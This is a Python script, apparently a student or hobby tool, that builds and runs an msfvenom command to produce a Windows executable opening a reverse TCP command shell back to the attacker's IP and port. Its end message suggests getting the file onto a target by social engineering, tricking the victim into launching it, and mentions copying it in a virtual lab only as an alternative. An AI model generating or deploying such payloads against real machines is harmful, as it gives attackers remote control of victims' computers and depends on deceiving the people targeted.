import os
import socket

#Function to print introduction of tool to terminal.
def start_note():
    print('\nWelcome to the Msfvenom Payload Generator Tool! This tool uses the' +
    '\nMsfvenom framework to generate an executable file which connects a victim' +
    '\nmachine to the attack machine (this computer) and, in this case, will launch' +
    '\na command shell to run in the background allowing the attack machine to' +
    '\nexecute commands remotely on the victim.\n' +
    '\n#PLEASE NOTE: This tool will only generate an executable for a reverse' +
    '\nshell connection and the executable can only be run on a windows machine.' +
    '\nThe Msfvenom framework itself is capable of generating different types of' +
    '\npayloads for many different operating systems, however, for simplicity ' +
    '\nof use in conjunction with the "Msfconsole Listener Tool", the payload is'
    '\nlimited as such. If you would like to research further on how this can'
    '\nbe done manually with control over the payload,'
    '\nplease visit:https://www.offensive-security.com/metasploit-unleashed/msfvenom/ \n')

#Function to print final notes about this tool to the terminal.
def end_note():
    print('\nIf payload generation was successful, you must now find a method to' +
    '\ntransport the payload to the machine you wish to target. One of the most' +
    '\ncommon ways which this is done is via a social enginering attack, which' +
    '\ninvolves tricking the target individual into launching the executable on' +
    '\ntheir machine. You may look into this further with some research on google,' +
    '\nhowever, for the purposes of testing within a virtual environment you may' +
    '\njust copy the file over to the target machine and launch open the payload.\n' +
    '\n#IMPORTANT: Be sure to only open the generated executable file after' +
    '\nprompted to by the "Msfconsole Listener Tool", as the listener must be' +
    '\nready to receive the connection. Also, ensure the update script is run' +
    '\nprior to using the "Msfconsole Listener Tool" for the first time, otherwise,' +
    '\nyou may run into issues running the tool. Good Luck!\n')

#Function to set IPv4 address of local machine.
def set_IP():
    #Uses google DNS server to check IP.
    try:
        p = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        p.connect(('8.8.8.8', 1))
        localhost_IP = p.getsockname()[0]
        p.close()
    except:
        localhost_IP = '#IP UNRETRIEVABLE#' #Try-except block prevents crash if IP cannot be retrieved.

    i = 0
    while(i == 0):
        check_IP = input('Is ' + localhost_IP + ' your IP Address? (y/n): ')

        if(check_IP == 'y'):
            i = 1
            return localhost_IP
        elif(check_IP == 'n'):
            localhost_IP = str(input('Enter Attacker IP Address (IP address of this machine): '))
            i = 1
            return localhost_IP
        else:
            print('Please enter only "y" or "n"')

#Function to set correct port for attack.
def set_port():
    i = 0
    while(i == 0):
        check_port = input('Would you like to use the default port (4444) for connection? (y/n): ')

        if(check_port == 'y'):
            i = 1
            return '4444'
        elif(check_port == 'n'):
            port = str(input('Enter Alternative Port Number: '))
            i = 1
            return port
        else:
            print('Please enter only "y" or "n"')

#Function to set name for executable file.
def set_name():
    name = str(input('Please enter a name for the executable file: '))
    return name

#Function to combine command which generates the executable.
def generate_payload():
    lhost = set_IP()
    lport = set_port()
    exeName = set_name()

    s1 = 'msfvenom -p windows/shell/reverse_tcp lhost='
    s2 = ' lport='
    s3 = ' -f exe > '
    s4 = '.exe'

    command = (s1 + lhost + s2 + lport + s3 + exeName + s4)
    return command

start_note()

#Runs command on user machine to generate executable file.
os.system(generate_payload())

end_note()


#REFERENCES:

#https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib
    #Used to help define 'set_IP()' function.